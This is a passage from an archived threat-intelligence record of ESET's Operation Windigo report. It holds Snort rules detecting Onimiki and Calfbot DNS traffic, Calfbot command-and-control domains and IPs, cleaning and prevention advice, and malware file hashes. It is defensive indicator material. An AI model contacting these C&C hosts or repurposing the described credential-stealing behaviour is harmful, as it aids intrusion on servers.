external entity sending DNS requests to an internal\nserver with the specific Linux/Cdorked URL pattern will trigger the alert.\n\n\n**alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:”Linux/Onimiki**\n**DNS trojan activity long format (Inbound)”; byte_test:1,!**\n**&,128,2; content:”|00 01 00 00 00 00 00 00 38|”; offset:4;**\n**depth:9; pcre:”/^[a-z0-9]{23}[a-f0-9]{33}.[a-z0-9\\-_]+.[az0-**\n**9\\-_]+\\x00\\x00\\x01\\x00\\x01/Rsi”; reference:url,http://**\n**www.welivesecurity.com/wp-content/uploads/2014/03/**\n**operation_windigo.pdf; reference:url,https://github.com/eset/malwareioc;**\n**classtype:trojan-activity; sid:1000004; rev:2;)**\n**alert udp $HOME_NET any -> any 53 (msg:”Linux/Onimiki DNS trojan**\n**activity long format (Outbound)”; byte_test:1,!&,128,2; content:”|**\n**00 01 00 00 00 00 00 00 38|”; offset:4; depth:9; pcre:”/^[a-z0-9]**\n**{23}[a-f0-9]{33}.[a-z0-9\\-_]+.[a-z0-9\\-_]+\\x00\\x00\\x01\\x00\\x01/**\n**Rsi”; reference:url,http://www.welivesecurity.com/wp-content/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000005;**\n**rev:1;)**\n\n\n-----\n\n###### A.1.2.4. Perl/Calfbot\n\nSince Perl/Calfbot uses HTTPS, rules targeting the protocol are not useful. Instead these rules\nwill match specific DNS requests.\n\nAny internal host sending DNS requests to properly labeled DNS servers with the Perl/Calfbot specific\ngenerated domains will trigger the alert.\n\n\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|vqvsaergek|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000006;**\n**rev:2;)**\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|pbcgmmympm|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000007;**\n**rev:2;)**\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|jmxkowzoen|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000008;**\n**rev:2;)**\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|tyixfhsfax|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000009;**\n**rev:2;)**\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|qgjhmerjec|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000010;**\n**rev:2;)**\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|njdyqrbioh|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000011;**\n**rev:2;)**\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|btloxcyrok|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000012;**\n**rev:2;)**\n**alert udp !$DNS_SERVERS any -> $DNS_SERVERS 53 (msg:”Perl/Calfbot C&C**\n**DNS request”; content:”|01 00 00 01 00 00 00 00 00 00|”; depth:10;**\n**offset:2; content:”|0a|afwyhvinmw|04|info|00|”; fast_pattern;**\n**nocase; distance:0; reference:url,http://www.welivesecurity.com/wpcontent/**\n**uploads/2014/03/operation_windigo.pdf; reference:url,https://**\n**github.com/eset/malware-ioc; classtype:trojan-activity; sid:1000013;**\n\n\n-----\n\nAlso, here is the list of domains and IP addresses that will be contacted by Perl/Calfbot in the same\norder as in the malware itself:\n\n\n**vqvsaergek.info**\n**pbcgmmympm.info**\n**jmxkowzoen.info**\n**tyixfhsfax.info**\n**77.67.80.31**\n**qgjhmerjec.info**\n**85.214.80.4**\n**njdyqrbioh.info**\n**btloxcyrok.info**\n**afwyhvinmw.info**\n**wyfxanxjeu.info**\n**qemyxsdigi.info**\n**94.23.208.20**\n\n\n-----\n\n### APPENDIX 2: CLEANING\n\n##### A.2.1. Linux/Ebury\n\nIn order to install Linux/Ebury on a system, the malware operators need root access. With this level\nof access, anything is possible. This is why we advise anyone infected to completely wipe their servers\nand rebuild them from scratch using a verified source. That’s the only way to make sure to get rid\nof this threat.\n\nMost importantly, assume that administrator and user credentials have been compromised.\nBecause of this, we advise anyone infected to reset all user and administrator credentials from\nknown clean machines and put a measure in place to prevent users from resetting their passwords\nto their original ones[4].\n\nIt is important to realize that Linux/Ebury stole the credentials of all login attempts made on an infected\nserver (successful or not). Additionally, it also steals credentials of connections originating from that\nserver, through a trojanized ssh binary, meaning that anyone using the server as an SSH relay will also\nhave the credentials to other servers stolen. Furthermore, ssh and ssh-add[5] will steal passphrases\nthat unlock SSH keys and will save in memory the unencrypted SSH keys so they can be retrieved later\nby the malware operators. This credential stealing infrastructure is very comprehensive and this\nis why we advise that infected organizations should take this very seriously and reconsider their server\nauthentication mechanisms. We will provide more advice in the prevention appendix.\n\n##### A.2.2. Linux/Cdorked\n\nWARNING Make sure you don’t have Linux/Ebury on your system. If you do see Linux/\nEbury’s cleaning section.\n\nDue to the presence of an interactive backdoor at the permission level of the Web server we also advise for a full\nreinstall of the compromised server from verified sources.\n\n##### A.2.3. Linux/Onimiki\n\nWARNING Make sure you don’t have Linux/Ebury on your system. If you do see Linux/\nEbury’s cleaning section.\n\nWe advise for a full reinstall of the compromised server from verified sources. If one is not willing\nto do that then a few steps would arguably be better than nothing:\n\n - Make sure that the user related to the named installation has no shell access (/etc/passwd)\n\n - Reinstall the main named binary (usually in /usr/sbin/named) and best done through\nyour package manager\n\n - Restart named\n\n##### A.2.4. Perl/Calfbot\n\nWARNING Make sure you don’t have Linux/Ebury on your system. If you do see Linux/\nEbury’s cleaning section.\n\nWe advise for a full reinstall of the compromised server from verified sources. If one is not willing\nto do that then a few steps would arguably be better than nothing:\n\n - Read Perl/Calfbot’s indicators of compromise section to understand how to look for Perl/Calfbot’s\nuser id and process id\n\n - Change any compromised user credentials (the one Perl/Calfbot is running under)\n\n - Kill the Perl process associated with Perl/Calfbot\n\n[4 the PAM modules cracklib or passwdqc seem like a good place to start](http://www.linux-pam.org/Linux-PAM-html/sag-pam_cracklib.html)\n5 an OpenSSH authentication agent helper\n\n\n-----\n\n### APPENDIX 3: PREVENTION\n\nHere are a few simple recommendations in order to protect yourself from this collection of threats:\n\n - Disable direct root login in your OpenSSH daemon\n(PermitRootLogin no in /etc/ssh/sshd_config)\n\n - Disable password-based logins and use an SSH key\n\n[• Use SSH Agent Forwarding to SSH from servers to servers instead of copying your SSH private](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html%23fwd)\n[keys on servers. On GNU/Linux use ssh-agent or GnomeKeyring with ForwardAgent yes under](http://www.openbsd.org/cgi-bin/man.cgi%3Fquery%3Dssh-agent)\n[a trusted Host entry in your .ssh/config file[6]. On Windows PuTTY’s Pageant supports SSH](http://the.earth.li/%257Esgtatham/putty/0.63/htmldoc/Chapter9.html%23pageant)\n[Agent Forwarding](http://the.earth.li/%257Esgtatham/putty/0.63/htmldoc/Chapter9.html%23pageant-forward)\n\n - Use two-factor authentication on your servers\n\n - Use an up to date antivirus solution\n\n6 \u0007This tutorial goes in greater details: https://help.github.com/articles/using-ssh-agent-forwarding\n\n\n-----\n\n### APPENDIX 4: FILE HASHES\n\n##### A.4.1. Linux/Ebury\n\nTrojanized sshd, ssh, ssh-add and the target of the libkeyutils.so.1 symbolic link.\n\n - **98cdbf1e0d202f5948552cebaa9f0315b7a3731d** Linux/Ebury – Version 0.4.4 – sshd\n\n - **4d12f98fd49e58e0635c6adce292cc56a31da2a2** Linux/Ebury – Version 0.4.4 – sshd\n\n - **0daa51519797cefedd52864be0da7fa1a93ca30b** Linux/Ebury – Version 0.8.0 – sshd\n\n - **7314eadbdf18da424c4d8510afcc9fe5fcb56b39** Linux/Ebury – Version 0.8.0 – sshd\n\n - **575bb6e681b5f1e1b774fee0fa5c4fe538308814** Linux/Ebury – Version 0.8.0 – ssh-add\n\n - **fa6707c7ef12ce9b0f7152ca300ebb2bc026ce0b** Linux/Ebury – Version 0.8.0 – ssh\n\n - **c4c28d0372aee7001c44a1659097c948df91985d** Linux/Ebury – Version 0.8.0 – ssh\n\n - **267d010201c9ff53f8dc3fb0a48145dc49f9de1e** Linux/Ebury – Version 1.1.0 – libkeyutils.so\n\n - **471ee431030332dd636b8af24a428556ee72df37** Linux/Ebury – Version 1.2.1 – libkeyutils.so\n\n - **58f185c3fe9ce0fb7cac9e433fb881effad31421** Linux/Ebury – Version 1.3.1 – libkeyutils.so\n\n - **09c8af3be4327c83d4a7124a678bbc81e12a1de4** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **2fc132440bafdbc72f4d4e8dcb2563cc0a6e096b** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **39ec9e03edb25f1c316822605fe4df7a7b1ad94a** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **3c5ec2ab2c34ab57cba69bb2dee70c980f26b1bf** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **74aa801c89d07fa5a9692f8b41cb8dd07e77e407** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **7adb38bf14e6bf0d5b24fa3f3c9abed78c061ad1** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **899b860ef9d23095edb6b941866ea841d64d1b26** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **8daad0a043237c5e3c760133754528b97efad459** Linux/Ebury – Version 1.3.2a – libkeyutils.so\n\n - **8f75993437c7983ac35759fe9c5245295d411d35** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **9bb6a2157c6a3df16c8d2ad107f957153cba4236** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **a7b8d06e2c0124e6a0f9021c911b36166a8b62c5** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **adfcd3e591330b8d84ab2ab1f7814d36e7b7e89f** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **b8508fc2090ddee19a19659ea794f60f0c2c23ff** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **bbce62fb1fc8bbed9b40cfb998822c266b95d148** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **bf1466936e3bd882b47210c12bf06cb63f7624c0** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **e14da493d70ea4dd43e772117a61f9dbcff2c41c** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **f1ada064941f77929c49c8d773cbad9c15eba322** Linux/Ebury – Version 1.3.2 – libkeyutils.so\n\n - **9e2af0910676ec2d92a1cad1ab89029bc036f599** Linux/Ebury – Version 1.3.3b – libkeyutils.so\n\n - **5d3ec6c11c6b5e241df1cc19aa16d50652d6fac0** Linux/Ebury – Version 1.3.3 – libkeyutils.so\n\n - **d552cbadee27423772a37c59cb830703b757f35e** Linux/Ebury – Version 1.3.3 – libkeyutils.so\n\n - **1a9aff1c382a3b139b33eeccae954c2d65b64b90** Linux/Ebury – Version 1.3.4b1 – libkeyutils.so\n\n - **2e571993e30742ee04500fbe4a40ee1b14fa64d7** Linux/Ebury – Version 1.3.4b2 – libkeyutils.so\n\n - **e2a204636bda486c43d7929880eba6cb8e9de068** Linux/Ebury – Version 1.3.5 – libkeyutils.so\n\n##### A.4.2. Linux/Cdorked\n\nTrojanized httpd (Apache), nginx or lighttpd.\n\n - **0004b44d110ad9bc48864da3aea9d80edfceed3f**\n\n - **03592b8147e2c84233da47f6e957acd192b3796a**\n\n\n-----\n\n - **10c6ce8ee3e5a7cb5eccf3dffd8f580e4fb49089**\n\n - **149cf77d2c6db226e172390a9b80bc949149e1dc**\n\n - **1972616a731c9e8a3dbda8ece1072bd16c44aa35**\n\n - **24e3ebc0c5a28ba433dfa69c169a8dd90e05c429**\n\n - **4f40bb464526964ba49ed3a3b2b2b74491ea89a4**\n\n - **5b87807b4a1796cfb1843df03b3dca7b17995d20**\n\n - **62c4b65e0c4f52c744b498b555c20f0e76363147**\n\n - **78c63e9111a6701a8308ad7db193c6abb17c65c4**\n\n - **858c612fe020fd5089a05a3ec24a6577cbeaf7eb**\n\n - **9018377c0190392cc95631170efb7d688c4fd393**\n\n - **a51b1835abee79959e1f8e9293a9dcd8d8e18977**\n\n - **a53a30f8cdf116de1b41224763c243dae16417e4**\n\n - **ac96adbe1b4e73c95c28d87fa46dcf55d4f8eea2**\n\n - **dd7846b3ec2e88083cae353c02c559e79124a745**\n\n - **ddb9a74cd91217cfcf8d4ecb77ae2ae11b707cd7**\n\n - **ee679661829405d4a57dbea7f39efeb526681a7f**\n\n - **fc39009542c62a93d472c32891b3811a4900628a**\n\n - **fdf91a8c0ff72c9d02467881b7f3c44a8a3c707a**\n\n##### A.4.3. Linux/Onimiki\n\nTrojanized named (BIND).\n\n - **42123cbf9d51fb3dea312290920b57bd5646cefb**\n\n - **ebc45dd1723178f50b6d6f1abfb0b5a728c01968**\n\n##### A.4.4. Perl/Calfbot\n\nPerl spam bot.\n\n - **5bdf483279a4a816ed4f8a235e799d5068d14f64**\n\n - **bd867907a5059ab1850918d24b4b9bbe33c16b76**\n\n - **a0f18b5ee2d347961b7109a22ea06cca962693d2**\n\n - **74cd5ae9f6bbdf27b4eaf45c4a22c6aae07345a2**\n\n##### A.4.5. Win32/Glupteba.M\n\nDropped by the exploit kit in non-English speaking countries.\n\n - **5196a8a034611aaa112232767aafd74b8ef71279**\n\n - **20467521bfd58e9ed388ce83467d73e8fd0293a7**\n\n - **f634f305a655b06f2647b82b58f7d3920546ac89**\n\n - **25a819d658d02548b2e5bdb52d2002df2f65b03a**\n\n - **6180d8c1c6967d15a0abb0895103ccc817e43362**\n\n - **051a89a7a335062829a8e938b8d4e3e2b532f6ff**\n\n##### A.4.6. Win32/Boaxxe.G\n\nDropped by the exploit kit in English speaking countries.\n\n - **035327b42f6e910b652bbdde5d9c270cfbaa9669**\n\n - 1dd7a18125353d426b5314c4ba04d60674ffa837\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf"
    ],
    "report_names": [
        "operation_windigo.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3844202f-b24a-4e16-b7b9-dfe8c0a44d5d",
            "created_at": "2022-10-25T16:07:24.526179Z",
            "updated_at": "2025-03-27T02:02:10.27234Z",
            "deleted_at": null,
            "main_name": "Operation Windigo",
            "aliases": [],
            "source_name": "ETDA:Operation Windigo",
            "tools": [
                "CDorked",
                "CDorked.A",
                "Calfbot",
                "Ebury"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716505,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1395058628,
    "ts_modification_date": 1395142034,
    "files": {
        "pdf": "https://archive.orkl.eu/fc22b1691454a74c74616a065bede2c80634873c.pdf",
        "text": "https://archive.orkl.eu/fc22b1691454a74c74616a065bede2c80634873c.txt",
        "img": "https://archive.orkl.eu/fc22b1691454a74c74616a065bede2c80634873c.jpg"
    }
}